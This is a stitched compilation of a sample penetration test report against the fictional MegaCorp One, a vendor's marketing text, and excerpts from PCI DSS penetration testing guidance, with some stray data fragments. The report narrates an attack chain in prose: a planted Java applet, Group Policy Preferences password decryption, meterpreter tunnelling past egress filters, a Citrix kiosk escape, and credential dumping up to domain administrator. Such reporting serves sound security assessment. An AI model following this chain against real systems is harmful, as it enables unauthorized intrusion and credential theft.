Page 11 of 34\\nAdministrative Privilege Escalation With interactive access to the underlying operating system of the administrative webserver obtained, we continued with the examination of the system searching for ways to escalate privileges to the administrative level. We found that the system was vulnerable to a local privilege escalation exploit4, which we were able to utilize successfully. Please see Appendix A for more information. Figure 13 – A local privilege escalation exploit is used to take advantage of an unpatched host and gain root-level access. The use of this exploit was partially made possible due to the inclusion of developer tools on the vulnerable system. If these tools were not present on the system, it would have still been possible to successfully exploit, although the difficulty in doing so would have been increased. In its current configuration, the webserver represents an internal attack platform for a malicious party. With the ability to gain full administrative access, a malicious party could utilize this vulnerable system for a multitude of purposes, ranging from attacks against MegaCorp One itself, to attacks against its customers.

This resulted in the discovery of a private section of the website that serves a Java applet only to specific workstations. This network range in question was later discovered to be the management network for MegaCorp One. Figure 14 - Htaccess rules reveal an additional subnet on the compromised network. Through examination of the log files and the Java applet present on the system, we found that the applet provided administrative functionality to a subset of internal users of MegaCorp One. This was advantageous to us as attackers, as it provided us with a potential path to internal systems that otherwise were not easily accessible. Upon obtaining permission from MegaCorp One, we added an additional applet to be downloaded by clients. The theory of this attack was that clients would access the trusted applet, allow it to run, and provide us with direct access to additional client hosts. This is a derivative of a common social engineering attack in which the victim is manipulated into running a malicious applet. In this case however, no effort was required to mislead the victim as the applet is already regarded as trusted. This attack worked as intended, providing us with access to an additional client system. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 13 of 34\\nFigure 15 – Using a malicious java applet it is possible to exploit a host on the management subnet. With this compromise in place, we obtained access to systems in the management network as indicated in Figure 16. Figure 16 – Successful java applet attack compromises the MegaCorp One management subnet. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 14 of 34\\nEscalation to Local Administrator The access provided by the Java applet attack was limited to the level of a standard user. To maximize the impact of the compromise we wanted to escalate access to the level of Domain Administrator. As the first step, we needed to obtain local administrative access. In an effort to accomplish this, we examined the compromised system to identify how it could be leveraged. Using this approach we found a Group Policy Preferences file on the system that allowed us to decrypt the local administrative password56. Please see Appendix A for more information. Figure 17 – Using the newly gained access it is possible to retrieve the Groups.xml file from a domain controller. 5http://msdn.microsoft.com/en-us/library/cc422924.aspx 6http://blogs.technet.com/b/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences- updated.aspx PTR-20130513 Copyright © 2013 Offensive Security",

Figure 19 – Using the encryption key published by Microsoft, the encrypted password is easily decrypted. Using the recovered plaintext password, we were able to gain local administrative access to the compromised client. Deep Packet Inspection Bypass While trying to establish additional layers of access into the compromised system, we encountered aggressive egress filtering. This was first encountered while trying to establish an encrypted outbound tunnel for the Microsoft Remote Desktop Protocol. Figure 20 – Initial attempts to establish an outbound tunnel for RDP were blocked by the egress filtering systems. Additionally, we discovered network protocol enforcement as we attempted to connect to the attacker SSH server on port 80. To bypass this, we created a tunnel within the existing meterpreter session to allow us to access Windows file sharing from the attacker system. This was utilized to run a windows command shell on the compromised host as the local administrative user. Within this shell, we executed an additional meterpreter payload. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 16 of 34\\nFigure 21 – Port forwarding through the initial meterpreter session is established in order to achieve direct access to the compromised management host. Figure 22 – Newly established connection is used to gain an administrative shell on the compromised management host.

Page 17 of 34\\nWith the new meterpreter shell in place, we then utilized HTTP-Tunnel, an open source utility7, that encapsulates arbitrary traffic within the HTTP payload. We used the newly established “http tunnel” to encapsulate a remote desktop connection between the attacker and compromised client. This allowed us to obtain full graphical access to the compromised client system. The remote desktop session was established using the password for user “mike”, which was discovered to be re-used from the compromised SQLite Manager application. Please see Appendix A for more information. Figure 24 - Remote Desktop access is established by encapsulating the previously filtered protocol through a http tunnel. At this point, the external perimeter of the MegaCorp One network was fully compromised as shown in Figure 25. The virtual equivalent of console access to a computer within the MegaCorp One’s trusted environment had been obtained. It should be noted that the current access to the Windows network was limited to a non-privileged domain user account and a local administrator account. 7 http://http-tunnel.sourceforge.net/ PTR-20130513 Copyright © 2013 Offensive Security Services LLC.

All rights reserved. Page 19 of 34\\nCitrix Environment Compromise Using remote desktop access to the internal network, we proceeded to explore the network in search of high value targets. One such target appeared to be a Citrix server, which was set as the homepage on the compromised host. Using the same credentials that were utilized to establish the remote desktop connection, we were able to successfully login to this Citrix environment. Figure 26 – A Citrix server offering only Internet Explorer was discovered on the MegaCorp One network. This Citrix environment exposed “Internet Explorer” as the only available application. This is a commonly utilized method by many organizations to limit access to the underlying operating system of the Citrix server. It is important to note that many methods exist to bypass this configuration. In this case, we utilized the “Save” dialog window to create a batch file that would provide us with a Powershell interface. This is possible as the “Save” dialog operates in much the same manner as a standard “Windows Explorer” file management window. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 20 of 34\\nFigure 27 – Using the Save dialog, it is possible to bypass the some restrictions imposed by the Citrix environment. Figure 28 – A batch file invoking the Powershell application is created on the Citrix server. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 21 of 34\\nFigure 29 – Citrix restriction is bypassed resulting in the execution of the Powershell. The ability to use Powershell was then utilized to download a malicious payload, which would provide us with a meterpreter session to the underlying Citrix server. Figure 30 - Powershell functionality allows an end-user to retrieve files from arbitrary sources, including remote internet locations. The ability to utilize the “Save” dialog to run arbitrary executable programs was combined with the previously discovered local administrator password allowing us to execute programs in the context of the local administrator. This allowed us to gain full administrative control of the Citrix system. Please see Appendix A for more information. PTR-20130513 Copyright © 2013 Offensive Security Services LLC.

Escalation to Domain Administrator With the Citrix server compromised, we made an attempt to capture passwords from memory. A Citrix server is an ideal candidate for this attack vector, as it typically operates for long periods of time without reboots and services a large number of users. To capture passwords from memory, we utilized the Windows Credential Editor tool8 due to its ability to run on 64 bit systems without causing adverse effects. 8 http://www.ampliasecurity.com/research/wcefaq.html PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 24 of 34\\nFigure 34 – Windows Credentials Editor is used to retrieve plaintext passwords from the Citrix server. This revealed multiple passwords, including a Windows domain administrator account. Please see Appendix A for more information. In order to validate the newly recovered credentials, we successfully created a new remote desktop session to the Citrix server using the domain administrator credentials. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 25 of 34\\nFigure 35 - Domain Administrator credentials are validated against the Citrix host. At this point, full control of the Windows domain had been obtained. A malicious attacker would have multiple tools at their disposal, including: o Utilization of Group Policy to deploy backdoor software on Windows systems. o Complete exfiltration of all data stored on any system that uses Windows authentication. o Destruction of any and all network resources. o Targeted attacks against any and all employees of MegaCorp One, through the use of information gathering tools such as keystroke loggers to identify personal information. o Leveraging this systemic access to conduct attacks against MegaCorp One suppliers and partners that maintain a trust relationship with the company. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 26 of 34\\nIt was determined that while these steps would be possible, they would be considered outside the scope of the current engagement. It was demonstrated that a total compromise of the MegaCorp One domain had been accomplished with a complete loss of integrity for all local systems.

These failures would have had a dramatic effect on MegaCorp One operations if a malicious party had exploited them. Current policies concerning password reuse and deployed access controls are not adequate to mitigate the impact of the discovered vulnerabilities.

The specific goals of the penetration test were stated as: o Identifying if a remote attacker could penetrate MegaCorp One’s defenses o Determining the impact of a security breach on: o Confidentiality of the company’s information o Internal infrastructure and availability of MegaCorp One’s information systems These goals of the penetration test were met. A targeted attack against MegaCorp One can result in a complete compromise of organizational assets. Multiple issues that would typically be considered minor were leveraged in concert, resulting in a total compromise of the MegaCorp One’s information systems. It is important to note that this collapse of the entire MegaCorp One security infrastructure can be greatly attributed to insufficient access controls at both the network boundary and host levels. Appropriate efforts should be undertaken to introduce effective network segmentation, which could help mitigate the effect of cascading security failures throughout the MegaCorp One infrastructure. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 28 of 34\\nRecommendations Due to the impact to the overall organization as uncovered by this penetration test, appropriate resources should be allocated to ensure that remediation efforts are accomplished in a timely manner. While a comprehensive list of items that should be implemented is beyond the scope of this engagement, some high level items are important to mention. Offensive Security recommends the following: 1. Ensure that strong credentials are use everywhere in the organization. The compromise of MegaCorp One system as drastically impacted by the use of weak passwords as well as the reuse of passwords across systems of differing security levels. NIST SP 800-119 is recommended for guidelines on operating an enterprise password policy. While this issue was not widespread within MegaCorp One, it was still an issue and should be addressed. 2. Establish trust boundaries. Create logical boundaries of trust where appropriate on the internal network. Each logical trust segment should be able to be compromised without the breach easily cascading to other segments. This should include the use of unique administrative accounts so that a compromised system in one segment cannot be used in other locations. 3. Implement and enforce implementation of change control across all systems: Misconfiguration and insecure deployment issues were discovered across the various systems. The vulnerabilities that arose can be mitigated through the use of change control processes on all server systems. 4. Implement a patch management program: Operating a consistent patch management program per the guidelines outlined in NIST SP 800-4010 is an important component in maintaining good security posture. This will help to limit the attack surface that results from running unpatched internal services. 5. Conduct regular vulnerability assessments. As part of an effective organizational risk management strategy, vulnerability assessments should be conducted on a regular basis. Doing so will allow the organization to determine if the installed security controls are properly installed, operating as intended, and producing the desired outcome. Please consult NIST SP 800-3011 for guidelines on operating an effective risk",

All rights reserved. Page 29 of 34\\nRisk Rating The overall risk identified to MegaCorp One as a result of the penetration test is High. A direct path from external attacker to full system compromise was discovered. It is reasonable to believe that a malicious entity would be able to successfully execute an attack against MegaCorp One through targeted attacks. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 30 of 34\\nAppendix A: Vulnerability Detail and Mitigation Risk Rating Scale In accordance with NIST SP 800-30, exploited vulnerabilities are ranked based upon likelihood and impact to determine overall risk. Default or Weak Credentials Rating: High Description: An externally exposed administrative interface is only protected with a weak password. Impact: Using common enumeration and brute-forcing techniques, it is possible to retrieve the administrative password for the SQLite Manager web interface. Due to the lack of any additional authentication mechanisms, it is also possible to retrieve all user password hashes in the underlying database. Successful retrieval of plaintext passwords could allow further compromise of the target environment if password reuse is found to exist. Remediation: Ensure that all administrative interfaces are protected with complex passwords or passphrases. Avoid use of common or business related words, which could be found or easily constructed with the help of a dictionary. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 31 of 34\\nPassword Reuse Rating: High Description: MegaCorp One user “mike” was found to be reusing credentials for the SQLite Manager application and his Windows domain access. Impact: Password reuse in general is a practice which should be highly discouraged and prevented to the extend possible. In this case, the impact of the vulnerability is amplified by the fact that an external attacker indirectly compromised a valid set of internal Windows domain credentials. This compromise potentially allows a substantial increase in the attack surface. Remediation: Update the password management policies to enforce the use of strong, unique, passwords for all disparate services. The use of password managers should be encouraged to more easily allow employees to utilize unique passwords across the various systems. Shared Local Administrator Password Rating: High Description: A number of MegaCorp One hosts are provisioned with the same local administrator password. Impact: MegaCorp One uses a Group Policy to set a local administrator password on all hosts within the scope of the GPO. Using the same local administrator password on corporate systems allows an attacker with appropriate access to utilize the well-known “pass-the-hash” attack vector. It allows an attacker to successfully authenticate on all hosts that share the same password, using",

    "text": "local administrator password on all hosts within the scope of the GPO. Using the same local administrator password on corporate systems allows an attacker with appropriate access to utilize the well-known “pass-the-hash” attack vector. It allows an attacker to successfully authenticate on all hosts that share the same password, using only the retrieved password hash. As such, the attack does not rely on successful decryption of the hash and it significantly increases the security breach footprint. Remediation: It is highly recommended to disable all local administrator accounts. In cases where a local administrative account is necessary, it should be assigned a unique name and a complex random password. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved. Page 32 of 34\\nPatch Management Rating: High Description: MegaCorp One’s external and internal environments contain a number of unpatched systems and application. Impact: A combination of weak authentication and unpatched hosts, which contain known vulnerabilities with publicly available exploits, allows an attacker to gain unauthorized access to a large number of MegaCorp One’s assets. Specifically, discovered instance of SQLite Manager is vulnerable to a remote code execution vulnerability and the underlying host also contains a local privilege escalation vulnerability, which can easily be leveraged to compromise the externally exposed host entirely. This appears to be an indication of an insufficient patch management policy and its implementation. Remediation: All corporate assets should be kept current with latest vendor-supplied security patches. This can be achieved with vendor-native tools or third-party applications, which can provide an overview of all missing patches. In many instances, third-party tools can also be used for patch deployment throughout a heterogeneous environment. DNS Zone Transfer Rating: Low Description: A misconfigured DNS server allows unrestricted zone transfers. Impact: A DNS server, which is configured to allow zone transfers to any DNS server, can provide sensitive information about corporate assets and network layouts. Remediation: DNS zone transfers should be restricted only to pre-approved servers. Default Apache Files Rating: Low Description: Default Apache files were discovered on the admin.megacorpone.com host. Impact: An attacker may be able to guess the exact version of the running Apache server by inspecting the contents of the default files. Additional sensitive information may also be available. Remediation: Remove all default files from publicly accessible web servers. PTR-20130513 Copyright © 2013 Offensive Security Services LLC. All rights reserved.

Penetration testing for coverage has risen in popularity in recent years as a simplified method of assessments used in situations where the goal is to meet regulatory needs. As a form of vulnerability scanning, penetration testing for coverage includes selective verification of discovered issues through exploitation.

This allows service providers the ability to conduct the work largely through the use of automated toolsets and maintain consistency of product across multiple engagements. Penetration testing for impact is a form of attack simulation under controlled conditions, which closely mimics the real world, targeted attacks that organizations face on a day-to-day basis. Penetration testing for impact is a goal-based assessment, which creates more than a simple vulnerability inventory, instead providing the true business impact of a breach. An impact-based penetration test identifies areas for improvement that will result in the highest rate of return for the business. Penetration testing for impact poses the challenge of requiring a high skillset to successfully complete. As demonstrated in this sample report, Offensive Security believes that it is uniquely qualified to deliver world-class results when conducting penetration tests for impact, due to the level of expertise found within our team of security professionals. Offensive Security does not maintain a separate team for penetration testing and other activities that the company is engaged in. This means that the same individuals that are involved in Offensive Security’s industry leading performance-based training, the production of industry standard tools such as Kali Linux, authors of best selling books, creators of 0-day exploits, and maintainers of industry references such as Exploit-DB are the same individuals that are involved in the delivery of services. Offensive Security offers a product that cannot be matched in the market. However, we may not be the right fit for every job. Offensive Security typically conducts consulting services with a low volume, high skill ratio to allow Offensive Security staff to more closely mimic real world situations. This also allows customers to have increased access to industry-recognized expertise all while keeping costs reasonable. As such, high volume/fast turn-around engagements are often not a good fit for our services. Offensive Security is focused on conducting high quality, high impact assessments and is actively sought out by customers in need of services that cannot be delivered by other vendors.

The guidance focuses on the following:  Penetration Testing Components: Understanding of the different components that make up a penetration test and how this differs from a vulnerability scan including scope, application and network-layer testing, segmentation checks, and social engineering.  Qualifications of a Penetration Tester: Determining the qualifications of a penetration tester, whether internal or external, through their past experience and certifications.  Penetration Testing Methodologies: Detailed information related to the three primary parts of a penetration test: pre-engagement, engagement, and post-engagement.  Penetration Testing Reporting Guidelines: Guidance for developing a comprehensive penetration test report that includes the necessary information to document the test as well as a checklist that can be used by the organization or the assessor to verify whether the necessary content is included. The information in this document is intended as supplemental guidance and does not supersede, replace, or extend PCI DSS requirements. The current version of PCI DSS at the time of publication is v3.2; however, the general principles and practices offered here may also be applicable to other versions of PCI DSS. 1.2 Intended Audience This guidance is intended for entities that are required to conduct a penetration test whether they use an internal or external resource. In addition, this document is intended for companies that specialize in offering penetration test services, and for assessors who help scope penetration tests and review final test reports. The guidance is applicable to organizations of all sizes, budgets, and industries. 1.3 Terminology The following terms are used throughout this document:  Application-layer testing: Testing that typically includes websites, web applications, thick clients, or other applications.  Black-box testing: Testing performed without prior knowledge of the internal structure/design/implementation of the object being tested.  Common Vulnerability Scoring System (CVSS): Provides an open framework for communicating the characteristics and impacts of IT vulnerabilities.  Grey-box testing: Testing performed with partial knowledge of the internal structure/design/implementation of the object being tested. The intent of this document is to provide supplemental information. Information provided here does not 4\\n National Vulnerability Database (NVD): The U.S. government repository of standards based vulnerability management data. This data enables automation of vulnerability management, security measurement, and compliance (e.g., FISMA).  Network-layer testing: Testing that typically includes external/internal testing of networks (LANS/VLANS), between interconnected systems, and wireless networks.  Penetration tester, tester, or team: The individual(s) conducting the penetration test for the entity.

It begins by providing background and definitions for topics common to all penetration test efforts (including scoping the test, critical systems to test, application and network-layer test inclusions, etc.). The document then moves on to practical guidance on selecting a penetration tester, methodologies that are used before, during, and after a test, guidelines for reporting and evaluating test results. The document concludes with case studies that attempt to illustrate the concepts presented in this supplement. Appendix A provides a quick-reference table to specific sections of this document where guidance on a particular PCI DSS requirement can be found. This may be useful for those wishing to quickly correlate the penetration testing requirements and guidelines presented in PCI DSS Requirement 11.3. The intent of this document is to provide supplemental information. Information provided here does not 5\\n2 Penetration Testing Components The goals of penetration testing are: 1. To determine whether and how a malicious user can gain unauthorized access to assets that affect the fundamental security of the system, files, logs and/or cardholder data. 2. To confirm that the applicable controls required by PCI DSS—such as scope, vulnerability management, methodology, and segmentation—are in place. There are three types of penetration tests: black-box, white-box, and grey-box. In a black-box assessment, the client provides no information prior to the start of testing. In a white-box assessment, the entity may provide the penetration tester with full and complete details of the network and applications. For grey-box assessments, the entity may provide partial details of the target systems. PCI DSS penetration tests are typically performed as either white-box or grey-box assessments. These types of assessments yield more accurate results and provide a more comprehensive test of the security posture of the environment than a pure black-box assessment. Performing a black-box assessment, when the entity provides no details of the target systems prior to the start of the test, may require more time, money, and resources for the deliverables to meet the requirements of PCI DSS. 2.1 How does a penetration test differ from a vulnerability scan? The differences between penetration testing and vulnerability scanning, as required by PCI DSS, can be summarized as follows: Vulnerability Scan Penetration Test Purpose Identify, rank, and report vulnerabilities that, if Identify ways to exploit vulnerabilities to exploited, may result in an intentional or circumvent or defeat the security features of unintentional compromise of a system. system components.

Information provided here does not 6\\nVulnerability Scan Penetration Test Reports Potential risks posed by known vulnerabilities, Description of each vulnerability verified and/or ranked in accordance with NVD/CVSS base potential issue discovered. More specific risks scores associated with each vulnerability. that vulnerability may pose, including specific methods how and to what extent it may be For PCI DSS, external vulnerability scans must exploited. Examples of vulnerabilities include but be performed by an ASV and the risks ranked in are not limited to SQL injection, privilege accordance with the CVSS. Internal vulnerability escalation, cross-site scripting, or deprecated scans may be performed by qualified personnel protocols. (does not require an ASV) and risks ranked in accordance with the organization’s risk-ranking process as defined in PCI DSS Requirement 6.1. An external vulnerability scan is conducted from outside the target organization. An internal vulnerability scan is conducted from inside the target organization. Duration Relatively short amount of time, typically several Engagements may last days or weeks seconds to several minutes per scanned host. depending on the scope of the test and size of the environment to be tested. Tests may grow in time and complexity if efforts uncover additional scope. 2.2 Scope PCI DSS defines the cardholder data environment (CDE) as “the people, processes, and technology that store, process, or transmit cardholder data or sensitive authentication data.” The scope of a penetration test, as defined in PCI DSS Requirement 11.3, includes the entire CDE perimeter and any critical systems. This applies both to the external perimeter (public-facing attack surfaces) and the internal perimeter of the CDE (LAN-LAN attack surfaces). The scope of testing may include locations of cardholder data, applications that store, process, or transmit cardholder data, critical network connections, access points, and other targets appropriate for the complexity and size of the organization. This should include resources and assets utilized by personnel to maintain systems in the CDE or to access cardholder data, as the compromise of such assets could allow an attacker to obtain credentials with access to or a route into the CDE. All penetration testing should only be conducted as defined by the rules of engagement agreed upon by both parties. See",

Information provided here does not 7\\n2.2.1 External Penetration Test The scope of an external penetration test is the exposed external perimeter of the CDE and critical systems connected or accessible to public network infrastructures. It should assess any unique access to the scope from the public networks, including services that have access restricted to individual external IP addresses. Testing must include both application-layer and network-layer assessments. External penetration tests also include remote access vectors such as dial-up and VPN connections. 2.2.2 Internal Penetration Test The scope of the internal penetration test is the internal perimeter of the CDE and critical systems from the perspective of the internal network. Testing must include both application-layer and network-layer assessments. Where the CDE is also the only internal network and there is no internal CDE perimeter, the scope of testing will typically be focused on critical systems. For example, testing activities may include attempting to bypass internal access controls intended to prevent unauthorized access or use of systems that store, process, or transmit CHD from those that do not. In cases where there is an internal CDE perimeter, the scope of testing will need to consider the CDE perimeter as well as critical systems within and outside of the CDE. For example, the testing may attempt to exploit permitted access paths from systems on an internal network segment into the CDE. When access to the CDE is obtained as a result of the testing, the scope of the penetration test may allow the tester to continue exploring inside the network and further the attack against other systems within the CDE, and may also include testing any data-exfiltration prevention (data-loss prevention) controls that are in place. In all cases, the scope of internal testing should consider the specific environment and the entity’s risk assessment. Entities are encouraged to consult with their assessor and the penetration tester to ensure the scope of the penetration test is sufficient and appropriate for their particular environment. 2.2.3 Testing Segmentation Controls The intent of segmentation is to prevent out-of-scope systems from being able to communicate with systems in the CDE or impact the security of the CDE. When properly implemented, a segmented (out-of- scope) system component could not impact the security of the CDE, even if an attacker obtained control of the out-of-scope system. If segmentation controls are implemented, testing of the controls is required to confirm that the segmentation methods are working as intended and that all out-of-scope systems and networks are isolated from systems in the CDE. The scope of segmentation testing should consider any networks and systems considered as being out of",

The intent of this document is to provide supplemental information. Information provided here does not 8\\n2.2.4 Critical Systems The term “critical systems” is used in PCI DSS to reference systems that are involved in the processing or protection of cardholder data. PCI DSS provides examples of critical systems that may be impacted by identified vulnerabilities including “security systems, public-facing devices and systems, databases, and other systems that store, process, or transmit cardholder data” (Requirement 6.1). However, for the purposes of a penetration test, there may be additional systems outside the CDE boundaries that could affect the security of the CDE. These systems should also be considered to be critical systems. Common examples of critical systems relevant to a penetration test might include: security systems (for example, firewalls, intrusion-detection systems/intrusion-prevention systems (IDS/IPS), authentication servers, e- commerce redirection servers, etc.), or any assets utilized by privileged users to support and manage the CDE. Please note that critical systems are defined by the entity, as each environment is different. 2.3 Application-Layer and Network-Layer Testing Any software written by or specifically for the organization that is part of the penetration test scope should be subject to both an application and network-layer penetration test. This assessment helps identify security defects that result from either insecure application design or configuration, or from employing insecure coding practices or security defects that may result from insecure implementation, configuration, usage, or maintenance of software. The remediation of vulnerabilities identified during an application-layer assessment may involve redesigning or rewriting insecure code. The remediation of vulnerabilities identified during a network-layer assessment typically involves either reconfiguring or updating software. In some instances, remediation may include deploying a secure alternative to insecure software. 2.3.1 Authentication If the application requires user authentication to the custom software, testing should be performed against all roles or types of access assumed by these parties. Also, testing should be performed against any role or access type that does not have explicit authorization to cardholder data to verify accounts without access cannot compromise such data. For customers running applications on multitenant servers that provide customers access to their cardholder data, authenticated testing should be performed to ensure customer access is properly restricted to only their own cardholder data. The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those",

The customer should provide the penetration tester with credentials that have equivalent permission(s) as a customer user, to allow the penetration tester to determine whether those credentials allow access to data beyond the entity’s data. 2.3.2 PA-DSS Compliant Applications If a payment application has been PA-DSS validated, the application’s functionality does not need to be tested as part of the entity’s PCI DSS compliance validation. However, the implementation of the application does need to be tested. This includes both the operating system and any exposed services, but not the payment application’s functionality (e.g., authentication, key management, transaction processing, etc.) since this was validated as part of the PA-DSS application validation. The intent of this document is to provide supplemental information. Information provided here does not 9\\n2.3.3 Web Applications It is common for an environment to host a web application that was not specifically coded for the organization such as commercial, off-the-shelf web-mail interfaces, document-sharing tools, file-transfer services, network-device administrative interfaces, etc. In these instances, the web application does not typically need an application-layer penetration test as the entity is not responsible for the source code of this type of software. Instead, the tester should perform a network-layer test and ensure the software was implemented, configured, and is currently being maintained in a secure manner (disabling or uninstalling unused services, blocking unused ports, applying current updates, etc.). 2.3.4 Separate Testing Environment Because of the nature and the intent of penetration testing, such testing in a production environment during normal business hours may impact business operations, and attempts to avoid disruption may increase the time, resources and complexity of the testing. This is especially important for high availability systems that may be impacted by penetration testing in a production environment. To avoid disruptions and to speed up testing, a separate environment that is identical to the production environment may be used for testing instead of the production environment. The penetration tester would need to ensure the same application and network-layer controls as production exist in the testing environment. This may be accomplished through methods to map out the production environment to verify it matches the testing environment. This should be included in the rules of engagement. All exploitable vulnerabilities identified during the testing must be corrected on production systems and testing repeated to verify that security weaknesses have been addressed. 2.4 Segmentation Checks PCI DSS Requirement 11.3.4 requires penetration testing to validate that segmentation controls and methods are operational, effective, and isolate all out-of-scope systems from systems in the CDE. Therefore, a robust approach to penetration testing is recommended to satisfy this requirement by actively attempting to identify routes and paths from networks outside the CDE into the CDE. All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests",

All segmentation methods need to be specifically tested. In very large networks, with numerous internal LAN segments, it may be infeasible for the penetration tester to conduct specific tests from every individual LAN segment. In this case, the testing needs to be planned to examine each type of segmentation methodology in use (i.e., firewall, VLAN ACL, etc.) in order to validate the effectiveness of the segmentation controls. The level of testing for each segmentation methodology should provide assurance that the methodology is effective in all instances of use. In order to effectively validate the segmentation methodologies, it is expected that the penetration tester has worked with the organization (or the organization’s QSA) to clearly understand all methodologies in use in order to provide complete coverage when testing. The penetration tester may choose to include systems located in these isolated LAN segments not directly related to the processing, transmission, or storage of cardholder data to ensure these systems could not impact the security of the CDE if compromised. See Section 4.2.3 for specific guidance on testing methodologies for validating segmentation controls. The intent of this document is to provide supplemental information. Information provided here does not 10\\n2.5 Social Engineering Social engineering is the attempt to gain information, access, or introduce unauthorized software into the environment through the manipulation of end users. PCI DSS reconfirms testing by requiring industry accepted penetration-testing approaches (many of which include social engineering as part of their approach) and to have an approach to penetration testing that \"considers the threats and vulnerabilities experienced by merchants in the last 12 months.\" This may include social-engineering attacks as a method used for introducing malware into the environment. Social-engineering tests are an effective method of identifying risks associated with end users’ failure to follow documented policies and procedures. There is no blanket approach to social-engineering engagements. If an organization chooses to include social-engineering testing as part of its annual security review, the tests performed should be appropriate for the size and complexity of the organization and should consider the maturity of the organization’s security awareness program. These tests might include in-person, non- technological interactions such as persuading someone to hold open a door, remote interactions such as having someone provide or reset a password, or convincing the end user to open a vulnerable e-mail attachment or hyperlink. While PCI DSS does not require testing to include social-engineering techniques, an entity can incorporate it into its penetration testing methodology as an ongoing method to determine the effectiveness of the security awareness program. The frequency of social-engineering tests would be determined by the entity when establishing its security awareness program. End-user security awareness re-education might be sufficient remediation for users who fail a social-engineering test. The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing",

The objective is that, over time, fewer and fewer employees are making poor decisions that could allow an attacker to compromise security. Additional guidance on establishing an effective and robust security awareness program can be found in the Document Library on the PCI SSC website. Social-engineering testing may not be appropriate or provide a meaningful result for all organizations. Although social-engineering testing is not a requirement of PCI DSS, an organization may consider documenting the reason(s) for foregoing social-engineering testing and include applicable documentation with the internal and external penetration test reports, particularly if social-engineering attacks were encountered in the last 12 months. 2.6 What is considered a “significant change”? Per PCI DSS Requirements 11.3.1 and 11.3.2, penetration testing must be performed at least annually and after any significant change—for example, infrastructure or application upgrade or modification—or new system component installations. What is deemed “significant” is highly dependent an entity’s risk- assessment process and on the configuration of a given environment. Because of this variability, a significant change is not prescribed by PCI DSS. If the change could impact the security of the network or allow access to cardholder data, it may be considered significant by the entity. Penetration testing of significant changes is performed to ensure that controls assumed to be in place are still working effectively after the upgrade or modification. The intent of this document is to provide supplemental information. Information provided here does not 11\\n3 Qualifications of a Penetration Tester Qualified internal resources or a qualified third party may perform the penetration test as long as they are organizationally independent. This means the penetration tester must be organizationally separate from the management of the target systems. For example, in situations where a third-party company is performing the PCI DSS assessment for the entity, that party cannot perform the penetration test if they were involved in the installation, maintenance, or support of target systems. The following guidelines may be useful when selecting a penetration tester (or team) to understand their qualifications to perform penetration testing. 3.1 Certifications Certifications held by a penetration tester may be an indication of the skill level and competence of a potential penetration tester or company. While these are not required certifications, they can indicate a common body of knowledge held by the candidate. The following are some examples of common penetration testing certifications:  Offensive Security Certified Professional (OSCP)  Certified Ethical Hacker (CEH)  Global Information Assurance Certification (GIAC) Certifications (e.g., GIAC Certified Penetration Tester (GPEN), GIAC Web Application Penetration Tester (GWAPT), or GIAC Exploit Researcher and Advanced Penetration Tester (GXPN))  CREST Penetration Testing Certifications  Communication Electronic Security Group (CESG) IT Health Check Service (CHECK) certification Note: The PCI SSC does not validate or endorse these certifications. 3.2 Past Experience Appropriate penetration testing experience and qualifications cannot be met by certifications alone.

Therefore, confirmation of additional criteria is necessary. For example, review of the extent of actual engagements that have been performed and relevant work experience are important considerations when selecting a penetration tester or team. The following questions are examples for assessing the qualifications and competency of a penetration tester or team. This is not an exhaustive list: Q How many years’ experience does the penetration tester have? • If the penetration tester is in their first year of penetration testing, careful consideration should be given to the following questions to ensure the penetration tester has sufficient knowledge and is adequately trained to perform the penetration test. Consideration should also be given to the organization itself by verifying the training and QA processes to ensure penetration tester is qualified. The intent of this document is to provide supplemental information. Information provided here does not 12\\nQ How many years has the organization that employs the penetration tester been performing penetration tests? • References from other customers may be useful in consideration. Q Has the penetration tester performed assessments against organizations of similar size and scope? • For environments with high availability constraints, unstable system components, or large infrastructures, it is important to evaluate a tester’s ability to handle those restrictions (bandwidth constraints, time constraints, etc.). Q What penetration testing experience has the penetration tester or team had with the technologies in the target environment (i.e., operating systems, hardware, web applications, highly customized applications, network services, protocols, etc.)? • When selecting a penetration tester, it is important to evaluate the past testing experience of the organization for which the tester works as it pertains to technologies specifically deployed within the target environment. • Even if the penetration tester has not performed an assessment against certain specific technologies, if the tester has managed, maintained, been trained on, or developed said technologies, the tester may still be qualified to perform the penetration test. Q Consider what other skills/qualifications the penetration tester has that will contribute to their ability to assess the environment. • Are there industry-standard penetration testing certifications held by the penetration tester? (See Section 3.1.) • What type of experience does the penetration tester have conducting network-layer penetration testing? Discussion of examples of network penetration testing efforts conducted by the organization may be warranted. • Does the penetration tester have experience conducting application-layer penetration testing? Discussion of the penetration tester’s familiarity with testing to validate the OWASP Top 10 and other similar application secure-coding standards and examples of application penetration testing efforts conducted by the organization may be warranted.

